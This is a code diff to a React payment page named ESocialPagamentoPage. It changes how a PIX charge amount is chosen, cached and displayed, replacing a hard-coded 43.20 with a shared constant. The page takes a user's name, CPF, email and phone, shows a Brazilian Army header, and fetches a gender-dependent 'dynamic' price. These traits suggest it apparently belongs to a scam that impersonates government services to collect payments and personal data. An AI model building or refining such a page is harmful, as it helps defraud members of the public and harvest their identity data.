@@ -1,4 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
+import { PAYMENT_PRICES } from '@shared/paymentPrices';
 import { useLocation } from 'wouter';
 import { ExercitoHeader } from '@/components/ExercitoHeader';
 import { Shield, Clock, CheckCircle2, Copy, Loader2, AlertCircle } from 'lucide-react';
@@ -52,7 +53,7 @@ export default function ESocialPagamentoPage() {
   });
   const [pixData, setPixData] = useState<PixData | null>(null);
   const [isLoading, setIsLoading] = useState(true);
-  const [citAmount, setCitAmount] = useState(43.20);
+  const [citAmount, setCitAmount] = useState<number>(PAYMENT_PRICES.esocial);
   const [paymentStatus, setPaymentStatus] = useState('PENDING');
   const [apiError, setApiError] = useState(false);
   const [showCopiedAnimation, setShowCopiedAnimation] = useState(false);
@@ -97,7 +98,12 @@ export default function ESocialPagamentoPage() {
           if (age < 30 * 60 * 1000 && data?.id) {
             // Use daeValor (always in reais) for display; data.amount may be in centavos
             const savedDae = localStorage.getItem('daeValor');
-            const displayAmount = savedDae ? parseFloat(savedDae) : 43.20;
+            const issuedAmount = Number(data.amount);
+            const displayAmount = data.chargedAmount ?? (
+              Number.isFinite(issuedAmount) && issuedAmount > 0
+                ? (issuedAmount >= 1000 ? issuedAmount / 100 : issuedAmount)
+                : (savedDae ? parseFloat(savedDae) : PAYMENT_PRICES.esocial)
+            );
             const restored: PixData = {
               id: String(data.id),
               qrCode: data.qrCode || FALLBACK_QR_CODE,
@@ -115,11 +121,6 @@ export default function ESocialPagamentoPage() {
       } catch (_) {}
 
       // --- no valid cache: resolve amount then generate ---
-      const saved = localStorage.getItem('daeValor');
-      if (saved) {
-        const n = parseFloat(saved);
-        if (!isNaN(n)) { setCitAmount(n); generatePix(fullName, cpf, n, email, telefone); return; }
-      }
       try {
         const gParam = gender.toLowerCase().startsWith('f') ? 'f' : 'm';
         const res = await fetch(`/api/valor-dinamico?tipo=esocial&genero=${gParam}`);
@@ -131,7 +132,9 @@ export default function ESocialPagamentoPage() {
           return;
         }
       } catch (_) {}
-      generatePix(fullName, cpf, 43.20, email, telefone);
+      localStorage.setItem('daeValor', String(PAYMENT_PRICES.esocial));
+      setCitAmount(PAYMENT_PRICES.esocial);
+      generatePix(fullName, cpf, PAYMENT_PRICES.esocial, email, telefone);
     };
 
     resolveValor();
@@ -185,12 +188,15 @@ export default function ESocialPagamentoPage() {
           id: String(d.id),
           qrCode: d.qrCode,
           pixCode: d.pixCode,
-          amount: d.amount,
+          amount,
           status: d.status,
           createdAt: d.createdAt,
         };
         setPixData(pix);
-        localStorage.setItem('esocialPixData', JSON.stringify({ data: d, createdAt: new Date().toISOString() }));
+        localStorage.setItem('esocialPixData', JSON.stringify({
+          data: { ...d, chargedAmount: amount },
+          createdAt: new Date().toISOString(),
+        }));
       } else {
         throw new Error(result.error || 'API error');
       }
